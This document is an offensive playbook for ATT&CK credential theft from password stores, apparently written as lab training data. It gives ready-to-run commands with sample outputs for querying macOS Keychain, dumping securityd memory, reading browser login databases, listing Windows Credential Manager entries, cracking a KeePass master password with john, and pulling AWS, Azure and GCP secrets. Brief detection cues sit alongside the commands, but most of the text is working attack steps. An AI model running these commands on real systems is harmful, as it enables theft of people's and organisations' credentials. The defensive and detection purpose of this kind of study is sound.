# Credentials from Password Stores Playbook (ATT&CK T1555, Dataset-Ready)

> Purpose: provide realistic, high-value credential-access training data with commands, tool outputs, and analyst interpretation.
> Scope: authorized lab and sanctioned exercises only.

Credentials from Password Stores covers attempts to collect saved credentials from OS credential stores, browsers, password managers, and cloud secret stores.

- ATT&CK Technique ID: T1555
- Name: Credentials from Password Stores
- Sub-techniques in scope: T1555.001, T1555.002, T1555.003, T1555.004, T1555.005, T1555.006

---

## 0. Safety and Lab Controls

1. Use only test systems, test tenants, and synthetic credentials.
2. Never collect or export real production secrets.
3. Record exact source and destination of every extracted artifact.
4. Apply immediate secret rotation for any credential exposed in testing.
5. Preserve full evidence for model labels (command, output, interpretation).

### 0.1 Evidence Wrapper

```bash
mkdir -p evidence

run_pwstore() {
  local technique="$1"
  local label="$2"
  shift 2
  local ts
  ts="$(date -u +%Y%m%dT%H%M%SZ)"
  echo "[$ts] [$technique] $label" | tee -a evidence/password_stores.log
  "$@" 2>&1 | tee "evidence/${ts}_${technique}_${label}.txt"
}
```

### 0.2 Training Record Schema

```json
{
  "technique": "T1555.004",
  "technique_name": "Windows Credential Manager",
  "scenario": "Operator enumerates stored enterprise credentials in a Windows test VM",
  "command": "cmdkey /list",
  "tool_result": {"status":"success", "highlights":["Target: LegacyGeneric:target=TERMSRV/10.20.30.20"]},
  "analyst_interpretation": "Stored credential material could enable lateral movement",
  "confidence": 0.96,
  "mitigation_hint": "Reduce saved credential usage and enforce MFA for remote access"
}
```

---

## 1. Baseline Before Password Store Collection

Scenario:
- Capture credential policy and current login context before extraction simulation.

```bash
run_pwstore "T1555" "identity_baseline" sh -lc 'whoami; id; hostname; date -u'
```

Example result:

```text
corp\\labuser
uid=1000(labuser) gid=1000(labuser)
LAB-WS-22
2026-04-21T12:08:55Z
```

Analyst note:
- Baseline confirms actor context (user/root/admin) needed to interpret which stores are accessible.

---

## 2. T1555.001 Keychain (macOS)

Scenario:
- Adversary with user or elevated access enumerates and queries Keychain items for saved credentials.

### Command Path A: Enumerate Available Keychains

```bash
run_pwstore "T1555.001" "keychain_list" security list-keychains
run_pwstore "T1555.001" "keychain_default" security default-keychain
```

Example result:

```text
"/Users/labuser/Library/Keychains/login.keychain-db"
"/Library/Keychains/System.keychain"
```

### Command Path B: Query Saved Secret Item

```bash
run_pwstore "T1555.001" "keychain_query" security find-generic-password -s "Slack Safe Storage" -a "$USER" -g
```

Example result:

```text
keychain: "/Users/labuser/Library/Keychains/login.keychain-db"
class: "genp"
password: "xoxc-2f5c..."
```

Detection and hardening cues:
- Alert on unusual `security` CLI access patterns from non-admin tooling.
- Require user presence prompts and monitor keychain-access policy changes.

---

## 3. T1555.002 Securityd Memory

Scenario:
- Adversary with root privileges inspects `securityd` process memory artifacts to recover key material.

### Command Path A: Identify and Inspect Process Mapping

```bash
run_pwstore "T1555.002" "securityd_pid" sh -lc 'pgrep securityd'
run_pwstore "T1555.002" "securityd_vmmap" sh -lc 'sudo vmmap "$(pgrep securityd | head -n1)" | head -n 30'
```

Example result:

```text
214
==== Writable regions for process 214
MALLOC_SMALL 000000010a000000-000000010a800000 [ 8192K] rw-/rwx
```

### Command Path B: Save and Parse a Core Snapshot (Lab Simulation)

```bash
run_pwstore "T1555.002" "securityd_core" sh -lc 'sudo /usr/bin/lldb -p "$(pgrep securityd | head -n1)" -o "process save-core /tmp/securityd.core" -o "quit"'
run_pwstore "T1555.002" "securityd_core_parse" sh -lc 'strings /tmp/securityd.core | grep -Ei "acct|svce|token|password" | head -n 20'
```

Example result:

```text
Saving core to '/tmp/securityd.core'... done
acct=mail@corp.local
svce=imap.corp.local
```

Detection and hardening cues:
- Alert on debugger attachment/core-dump actions targeting `securityd`.
- Restrict root/debug privileges and enforce endpoint hardening controls.

---

## 4. T1555.003 Credentials from Web Browsers

Scenario:
- Adversary collects browser credential databases and attempts extraction/decryption.

### Command Path A: Chromium Credential Store Enumeration

```bash
run_pwstore "T1555.003" "chrome_login_data" sh -lc 'ls -l "$HOME/.config/google-chrome/Default/Login Data"'
run_pwstore "T1555.003" "chrome_login_query" sh -lc 'sqlite3 "$HOME/.config/google-chrome/Default/Login Data" "SELECT origin_url, username_value, length(password_value) FROM logins LIMIT 5;"'
```

Example result:

```text
https://portal.corp.local|j.dupont|96
https://vpn.corp.local|it.support|112
```

### Command Path B: Firefox Credential Artifact Collection

```bash
run_pwstore "T1555.003" "firefox_artifacts" sh -lc 'ls -l "$HOME/.mozilla/firefox"/*/logins.json "$HOME/.mozilla/firefox"/*/key4.db 2>/dev/null'
```

Example result:

```text
-rw------- 1 labuser staff 7821 Apr 21 10:55 /Users/labuser/.mozilla/firefox/abcd.default-release/logins.json
-rw------- 1 labuser staff 32768 Apr 21 10:55 /Users/labuser/.mozilla/firefox/abcd.default-release/key4.db
```

Detection and hardening cues:
- Watch for unusual access to browser credential files outside browser process lineage.
- Enforce full-disk encryption and strong local account protections.

---

## 5. T1555.004 Windows Credential Manager

Scenario:
- Adversary enumerates and abuses stored credentials from Windows Credential Locker/Vault.

### Command Path A: Enumerate Stored Credentials

```bash
run_pwstore "T1555.004" "cmdkey_list" cmd /c "cmdkey /list"
run_pwstore "T1555.004" "vault_list" cmd /c "vaultcmd /list"
```

Example result:

```text
Currently stored credentials:
Target: LegacyGeneric:target=TERMSRV/10.20.30.20
Vaults: 2
```

### Command Path B: List Credentials in Windows Vault

```bash
run_pwstore "T1555.004" "vault_list_creds" cmd /c "vaultcmd /listcreds:\"Windows Credentials\""
```

Example result:

```text
Credential schema: Windows Domain Password Credential
Resource: Domain:target=FILESRV.corp.local
User: CORP\\backupsvc
```

Detection and hardening cues:
- Alert on `cmdkey`/`vaultcmd` execution from atypical users or automation accounts.
- Reduce long-lived cached credentials and require MFA where possible.

---

## 6. T1555.005 Password Managers

Scenario:
- Adversary targets third-party password manager stores (file-based or unlocked-memory context).

### Command Path A: KeePass Database Discovery and Crack Preparation

```bash
run_pwstore "T1555.005" "keepass_discovery" sh -lc 'find "$HOME" -type f -name "*.kdbx" 2>/dev/null | head -n 20'
run_pwstore "T1555.005" "keepass_hash_extract" sh -lc 'keepass2john "$HOME"/vaults/team.kdbx > /tmp/team_keepass.hash'
```

Example result:

```text
/Users/labuser/vaults/team.kdbx
File encoded in hash format written to /tmp/team_keepass.hash
```

### Command Path B: Dictionary Attempt on Manager Master Secret (Lab)

```bash
run_pwstore "T1555.005" "keepass_john" sh -lc 'john --wordlist=/usr/share/wordlists/rockyou.txt /tmp/team_keepass.hash'
```

Example result:

```text
Winter2026!      (team.kdbx)
1g 0:00:00:06 DONE
```

Detection and hardening cues:
- Monitor for access to password manager DB paths and cracking tool usage on endpoints.
- Enforce strong master passphrases and hardware-backed unlocking.

---

## 7. T1555.006 Cloud Secrets Management Stores

Scenario:
- Adversary abuses cloud IAM permissions to list and retrieve secret values.

### Command Path A: AWS Secrets Manager

```bash
run_pwstore "T1555.006" "aws_list_secrets" aws secretsmanager list-secrets --max-results 10
run_pwstore "T1555.006" "aws_get_secret" aws secretsmanager get-secret-value --secret-id prod/db/password
```

Example result:

```text
"Name": "prod/db/password"
"SecretString": "P@ssw0rd-rotated-2026"
```

### Command Path B: Azure Key Vault

```bash
run_pwstore "T1555.006" "az_list_secrets" az keyvault secret list --vault-name corp-kv --maxresults 10
run_pwstore "T1555.006" "az_get_secret" az keyvault secret show --vault-name corp-kv --name db-password
```

Example result:

```text
"id": "https://corp-kv.vault.azure.net/secrets/db-password/..."
"value": "P@ssw0rd-rotated-2026"
```

### Command Path C: GCP Secret Manager

```bash
run_pwstore "T1555.006" "gcp_access_secret" gcloud secrets versions access latest --secret=db-password
```

Example result:

```text
P@ssw0rd-rotated-2026
```

Detection and hardening cues:
- Alert on secret reads from unusual principals, regions, or impossible travel context.
- Enforce least privilege IAM and short-lived workload identities.

---

## 8. Label-Ready Examples (JSONL)

```json
{"technique":"T1555.001","command":"security find-generic-password -s Slack Safe Storage -a $USER -g","result":"Password material returned from login keychain","interpretation":"macOS keychain credential retrieval succeeded"}
{"technique":"T1555.002","command":"lldb -p $(pgrep securityd) -o 'process save-core /tmp/securityd.core'","result":"Core image created and parsable strings found","interpretation":"Privileged securityd memory access may expose credential artifacts"}
{"technique":"T1555.003","command":"sqlite3 '.../Login Data' 'SELECT origin_url,username_value FROM logins'","result":"Saved browser login entries enumerated","interpretation":"Browser credential store access observed"}
{"technique":"T1555.004","command":"cmdkey /list","result":"Stored Windows targets and users listed","interpretation":"Credential Manager artifacts can support lateral movement"}
{"technique":"T1555.005","command":"keepass2john team.kdbx > team.hash","result":"KeePass hash extracted for offline cracking","interpretation":"Password manager database became offline attack target"}
{"technique":"T1555.006","command":"aws secretsmanager get-secret-value --secret-id prod/db/password","result":"Secret value returned","interpretation":"Cloud secret retrieval from management plane succeeded"}
```

---

## 9. Coverage Checklist

- T1555 Credentials from Password Stores
- T1555.001 Keychain
- T1555.002 Securityd Memory
- T1555.003 Credentials from Web Browsers
- T1555.004 Windows Credential Manager
- T1555.005 Password Managers
- T1555.006 Cloud Secrets Management Stores

This document is optimized for training corpus generation: scenario + command + output + interpretation + mitigation cues.
